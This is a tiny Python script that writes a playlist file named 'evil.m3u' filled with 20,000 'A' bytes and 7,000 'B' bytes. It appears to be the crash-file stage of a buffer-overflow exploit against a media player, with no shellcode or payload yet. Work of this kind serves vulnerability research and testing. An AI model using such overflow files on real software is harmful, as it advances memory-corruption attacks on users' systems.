#!/usr/bin/python

filename="evil.m3u"
buffer = "\x41"* 20000 + "\x42" * 7000 
textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()